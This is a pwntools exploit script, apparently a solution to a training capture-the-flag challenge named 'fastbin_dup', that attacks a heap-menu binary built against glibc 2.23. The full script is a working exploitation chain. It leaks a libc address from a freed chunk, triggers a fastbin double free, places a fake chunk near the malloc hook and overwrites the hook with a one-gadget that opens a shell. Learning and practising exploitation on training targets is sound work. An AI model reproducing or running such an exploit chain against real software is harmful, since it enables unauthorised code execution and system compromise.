from pwn import *

CHALL_PATH = './fastbin_dup'
CHALL = ELF(CHALL_PATH)
LIBC = ELF('./libc-2.23.so')
COMMANDS = """
c
"""

def alloc(c, size):
    c.recvuntil(b'> ')
    c.sendline(b'1')
    
    c.recvuntil(b'Size: ')
    c.sendline(str(size).encode())  #size is an integer, str(size) is a string, .encode() gives us the bytes
    line = c.recvline()
    index = int(line.split(b'index ')[1].split(b'!\n')[0])
    return index
    
def free(c, index):
    c.recvuntil(b'> ')
    c.sendline(b'4')
    
    c.recvuntil(b'Index: ')
    c.sendline(str(index).encode())  #size is an integer, str(size) is a string, .encode() gives us the bytes

def write(c, index, data):
    c.recvuntil(b'> ')
    c.sendline(b'2')
    
    c.recvuntil(b'Index: ')
    c.sendline(str(index).encode())  #size is an integer, str(size) is a string, .encode() gives us the bytes
    
    c.recvuntil(b'Content: ')
    c.send(data)

def read(c, index):
    c.recvuntil(b'> ')
    c.sendline(b'3')
    
    c.recvuntil(b'Index: ')
    c.sendline(str(index).encode())  #size is an integer, str(size) is a string, .encode() gives us the bytes
    
    line = c.recvline()
    return line

if args.REMOTE:
    c = remote('fastbin-dup.training.offensivedefensive.it', 8080, ssl = True)
    
elif args.GDB:
    c = gdb.debug(CHALL_PATH, COMMANDS)

else:
    c = process(CHALL_PATH)
    

#libc leak
alloc(c, 0x100) #index 0
alloc(c, 0x30) #index 1 - we need this chunk otherwise chunk 0, when freed, will be consolidated with the top chunk
free(c, 0)

leak = read(c, 0)[:6]
leak = leak.ljust(8, b'\x00')
leak = u64(leak)
LIBC.address = leak - 0x3c4b78 #LIBC.symbols['main_arena'] + 88 does not work because we don't have the main_arena symbols --> use gdb and ipython

print(f'LIBC LEAK: {hex(LIBC.address)}')

  
#exploitation
alloc(c, 0x60) #index 2
alloc(c, 0x60) #index 3

free(c, 2)
free(c, 3) #by doing this, the head of the list will point to this chunk
free(c, 2)

#heap_leak = read(c, 0)
#print(f'Leak: {heap_leak}')

alloc(c, 0x60) #index 4  - this will be the same chunk previously freed (index 2)
write(c, 4, p64(LIBC.address + 0x3c4aed)) #address for a fake chunk to allocate in the libc bss (done with gdb and ipython)

alloc(c, 0x60) #index 5
alloc(c, 0x60) #index 6

#now 0x3c4aed is in the head of the fastbins list

alloc(c, 0x60) #index 7, this is the fake chunk we use

#we need to write some hook but we cannot (the free hook is not ok, for the malloc hook we need to allocate a chunk a some bytes before the hook's address)
#to do so, we disalign the address of a chunk to allocate to have the right size for us

#overwrite the malloc hook with 
write(c, 7, b'A' * 19 + p64(LIBC.address + 0xf1247)) #we need a one-gadget i.e. a memory address the points to a chain of instruction that will automatically execute /bin/sh if some conditions are met

#When executing the script, manually allocate a new chunk of the right size to spawn a shell

c.interactive()